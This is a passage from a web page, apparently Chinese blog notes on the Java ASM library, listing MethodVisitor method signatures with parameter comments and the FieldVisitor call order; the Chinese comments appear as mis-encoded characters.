class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯åŠ¨å¯¹æ–¹æ³•ä»£ç çš„è®¿é—®ï¼Œå¦‚æœæœ‰çš„è¯ï¼ˆå³éæŠ½è±¡æ–¹æ³•ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®å±€éƒ¨å˜é‡å’Œæ“ä½œæ•°å †æ ˆå…ƒç´ çš„å½“å‰çŠ¶æ€</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypeå †æ ˆæ˜ å°„å¸§çš„ç±»å‹ï¼ˆstack map frameï¼‰</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnumLocalè¢«è®¿é—®å¸§ä¸­çš„å±€éƒ¨å˜é‡æ•°é‡</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramlocalè¢«è®¿é—®å¸§ä¸­çš„å±€éƒ¨å˜é‡ç±»å‹</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnumStackè¢«è®¿é—®å¸§ä¸­çš„æ“ä½œæ•°å †æ ˆå…ƒç´ ä¸ªæ•°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramstackè¢«è®¿é—®å¸§ä¸­çš„æ“ä½œæ•°å †æ ˆå…ƒç´ ç±»å‹</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitFrame</span><span class="params">(<span class="keyword">int</span> type, <span class="keyword">int</span> numLocal, java.lang.Object[] local, <span class="keyword">int</span> numStack, java.lang.Object[] stack)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®é›¶æ“ä½œæ•°çš„æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç </span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®å•ä¸ª int ç±»å‹æ“ä½œæ•°çš„æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šBIPUSHã€SIPUSHã€NEWARRAY</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramoperandè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œæ•°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitIntInsn</span><span class="params">(<span class="keyword">int</span> opcode, <span class="keyword">int</span> operand)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®å±€éƒ¨å˜é‡æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> * å±€éƒ¨å˜é‡æŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å±€éƒ¨å˜é‡å€¼çš„æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šILOADã€LLOADã€FLOADã€DLOADã€ALOADã€ISTOREã€LSTOREã€FSTOREã€DSTOREã€ASTOREã€RET</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvarè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œæ•°ï¼ˆå±€éƒ¨å˜é‡çš„ä¸‹æ ‡ï¼‰</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitVarInsn</span><span class="params">(<span class="keyword">int</span> opcode, <span class="keyword">int</span> <span class="keyword">var</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®ç±»å‹æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> * ç±»å‹æŒ‡ä»¤æ˜¯ä»¥ç±»çš„å†…éƒ¨åç§°ä½œä¸ºå‚æ•°çš„æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šNEWã€ANEWARRAYã€CHECKCASTã€INSTANCEOF</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œæ•°ï¼ˆå¯¹è±¡æˆ–æ•°ç»„ç±»çš„å†…éƒ¨åç§°ï¼‰</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitTypeInsn</span><span class="params">(<span class="keyword">int</span> opcode, java.lang.String type)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®å­—æ®µæŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> * å­—æ®µæŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µå€¼çš„æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šGETSTATICã€PUTSTATICã€GETFIELDã€PUTFIELD</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramownerå­—æ®µæ‰€æœ‰è€…ç±»çš„å†…éƒ¨åç§°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnameå­—æ®µçš„åç§°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptorå­—æ®µçš„æè¿°ç¬¦</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitFieldInsn</span><span class="params">(<span class="keyword">int</span> opcode, java.lang.String owner, java.lang.String name, java.lang.String descriptor)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®æ–¹æ³•æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> * æ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šINVOKEVIRTUALã€INVOKESPECIALã€INVOKESTATICã€INVOKEINTERFACE</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramowneræ–¹æ³•æ‰€æœ‰è€…ç±»çš„å†…éƒ¨åç§°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnameæ–¹æ³•çš„åç§°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptoræ–¹æ³•çš„æè¿°ç¬¦</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramisInterfaceæ–¹æ³•çš„æ‰€æœ‰è€…ç±»æ˜¯å¦ä¸ºæ¥å£</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, java.lang.String owner, java.lang.String name, java.lang.String descriptor, <span class="keyword">boolean</span> isInterface)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—® invokedynamic æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnameæ–¹æ³•çš„åç§°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptoræ–¹æ³•çš„æè¿°ç¬¦</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parambootstrapMethodHandleå¼•å¯¼æ–¹æ³•</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parambootstrapMethodArgumentså¼•å¯¼æ–¹æ³•çš„å¸¸é‡å‚æ•°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInvokeDynamicInsn</span><span class="params">(java.lang.String name, java.lang.String descriptor, Handle bootstrapMethodHandle, java.lang.Object... bootstrapMethodArguments)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®è·³è½¬æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è·³è½¬æŒ‡ä»¤æ˜¯å¯ä»¥è·³è½¬åˆ°å¦ä¸€æ¡æŒ‡ä»¤çš„æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcodeè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œç ï¼šIFEQã€IFNEã€IFLTã€IFGEã€IFGTã€IFLEã€IF_ICMPEQã€IF_ICMPNEã€IF_ICMPLTã€IF_ICMPGEã€IF_ICMPGTã€IF_ICMPLEã€IF_ACMPEQã€IF_ACMPNEã€GOTOã€JSRã€IFNULLã€IFNONNULL</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramlabelè¦è®¿é—®çš„æŒ‡ä»¤çš„æ“ä½œæ•°ï¼ˆæ ‡ç­¾ï¼ŒæŒ‡å®šè·³è½¬æŒ‡ä»¤å¯ä»¥è·³è½¬åˆ°çš„æŒ‡ä»¤ï¼‰</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitJumpInsn</span><span class="params">(<span class="keyword">int</span> opcode, Label label)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®æ ‡ç­¾</span></span></span><br><span class="line"><span class="function"><span class="comment"> * æ ‡ç­¾æŒ‡å®šç´§éšå…¶åçš„æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramlabelæ ‡ç­¾å¯¹è±¡</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitLabel</span><span class="params">(Label label)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—® LDC æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvalueè¦åŠ è½½åˆ°å †æ ˆä¸Šçš„å¸¸æ•°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitLdcInsn</span><span class="params">(java.lang.Object value)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—® IINC æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvalueè¦é€’å¢çš„å±€éƒ¨å˜é‡çš„ç´¢å¼•</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramincrementé€’å¢çš„æ•°é‡</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitIincInsn</span><span class="params">(<span class="keyword">int</span> <span class="keyword">var</span>, <span class="keyword">int</span> increment)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—® TABLESWITCH æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramminæœ€å°é”®å€¼</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parammaxæœ€å¤§é”®å€¼</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdflté»˜è®¤å¤„ç†ç¨‹åºå—çš„å¼€å§‹éƒ¨åˆ†</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramlabelså¤„ç†ç¨‹åºå—çš„å¼€å§‹</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitTableSwitchInsn</span><span class="params">(<span class="keyword">int</span> min, <span class="keyword">int</span> max, Label dflt, Label... labels)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—® LOOKUPSWITCH æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdflté»˜è®¤å¤„ç†ç¨‹åºå—çš„å¼€å§‹éƒ¨åˆ†</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramkeysé”®å€¼</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramlabelså¤„ç†ç¨‹åºå—çš„å¼€å§‹</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitLookupSwitchInsn</span><span class="params">(Label dflt, <span class="keyword">int</span>[] keys, Label[] labels)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—® MULTIANEWARRAY æŒ‡ä»¤</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptoræ•°ç»„ç±»å‹çš„æè¿°ç¬¦</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnumDimensionsè¦åˆ†é…çš„æ•°ç»„çš„ç»´æ•°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMultiANewArrayInsn</span><span class="params">(java.lang.String descriptor, <span class="keyword">int</span> numDimensions)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®æŒ‡ä»¤ä¸Šçš„æ³¨é‡Š</span></span></span><br><span class="line"><span class="function"><span class="comment"> * å¿…é¡»åœ¨å¸¦æ³¨é‡Šçš„æŒ‡ä»¤ä¹‹åè°ƒç”¨æ­¤æ–¹æ³•ï¼Œå¯¹åŒä¸€æŒ‡ä»¤å¯ä»¥å¤šæ¬¡è°ƒç”¨</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypeRefå¯¹æ³¨é‡Šç±»å‹çš„å¼•ç”¨</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypePathtypeRef ä¸­å¸¦æ³¨é‡Šçš„ç±»å‹å‚æ•°/é€šé…ç¬¦ç»‘å®š/æ•°ç»„å…ƒç´ ç±»å‹/é™æ€å†…éƒ¨ç±»å‹çš„è·¯å¾„</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptoræ³¨é‡Šç±»çš„æè¿°ç¬¦</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvisibleè¿è¡Œæ—¶æ˜¯å¦å¯è§</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AnnotationVisitor <span class="title">visitInsnAnnotation</span><span class="params">(<span class="keyword">int</span> typeRef, TypePath typePath, java.lang.String descriptor, <span class="keyword">boolean</span> visible)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—® try catch å—</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramstartå¼‚å¸¸å¤„ç†ç¨‹åºèŒƒå›´çš„å¼€å§‹ï¼ˆåŒ…å«ï¼‰</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramendå¼‚å¸¸å¤„ç†ç¨‹åºèŒƒå›´çš„ç»“æŸï¼ˆä¸åŒ…å«ï¼‰</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramhandlerå¼‚å¸¸å¤„ç†ç¨‹åºä»£ç çš„å¼€å¤´</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypeç”±å¤„ç†ç¨‹åºå¤„ç†çš„å¼‚å¸¸ç±»å‹çš„å†…éƒ¨åç§°ï¼Œæˆ– null æ¥æ•è·ä»»ä½•å¼‚å¸¸ï¼ˆå¯¹ finally å—ï¼‰</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitTryCatchBlock</span><span class="params">(Label start, Label end, Label handler, java.lang.String type)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®å¼‚å¸¸å¤„ç†ç¨‹åºç±»å‹ä¸Šçš„æ³¨é‡Š</span></span></span><br><span class="line"><span class="function"><span class="comment"> * å¿…é¡»åœ¨ visitTryCatchBlock ä¹‹åè°ƒç”¨ï¼Œå¯¹åŒä¸€ä¸ªå¼‚å¸¸å¤„ç†ç¨‹åºå¯ä»¥å¤šæ¬¡è°ƒç”¨</span></span></span><br><span class="line"><span class="function"><span class="comment"> * </span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypeRefå¯¹æ³¨é‡Šç±»å‹çš„å¼•ç”¨</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypePathtypeRef ä¸­å¸¦æ³¨é‡Šçš„ç±»å‹å‚æ•°/é€šé…ç¬¦ç»‘å®š/æ•°ç»„å…ƒç´ ç±»å‹/é™æ€å†…éƒ¨ç±»å‹çš„è·¯å¾„</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptoræ³¨é‡Šç±»çš„æè¿°ç¬¦</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvisibleè¿è¡Œæ—¶æ˜¯å¦å¯è§</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AnnotationVisitor <span class="title">visitTryCatchAnnotation</span><span class="params">(<span class="keyword">int</span> typeRef, TypePath typePath, java.lang.String descriptor, <span class="keyword">boolean</span> visible)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®æ–¹æ³•çš„æœ€å¤§å †æ ˆå¤§å°å’Œæœ€å¤§å±€éƒ¨å˜é‡æ•°é‡</span></span></span><br><span class="line"><span class="function"><span class="comment"> * </span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parammaxStackæ–¹æ³•çš„æœ€å¤§å †æ ˆå¤§å°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parammaxLocalsæ–¹æ³•çš„æœ€å¤§å±€éƒ¨å˜é‡æ•°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMaxs</span><span class="params">(<span class="keyword">int</span> maxStack, <span class="keyword">int</span> maxLocals)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®æ–¹æ³•çš„æœ«å°¾</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è¯¥æ–¹æ³•æ˜¯æœ€åä¸€ä¸ªè¢«è°ƒç”¨çš„æ–¹æ³•ï¼Œç”¨äºé€šçŸ¥è®¿é—®è€…è¯¥æ–¹æ³•çš„æ‰€æœ‰æ³¨é‡Šå’Œå±æ€§å·²ç»è¢«è®¿é—®</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><h4 id="3-FieldVisitor"><a href="#3-FieldVisitor" class="headerlink" title="3. FieldVisitor"></a>3. FieldVisitor</h4><p>æ–¹æ³•è°ƒç”¨é¡ºåºï¼ˆè®¿é—®é¡ºåºï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( visitAnnotation | visitTypeAnnotation | visitAttribute )* visitEnd</span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>JSRInlinerAdapter ç”¨äºç®€åŒ–ä»£ç åˆ†æï¼Œåˆ é™¤ JSR æŒ‡ä»¤å¹¶å†…è”å¼•ç”¨çš„å­ä¾‹ç¨‹ï¼ˆæ²¡æ‡‚ï¼‰</p><blockquote><p>A MethodVisitor that removes JSR instructions and inlines 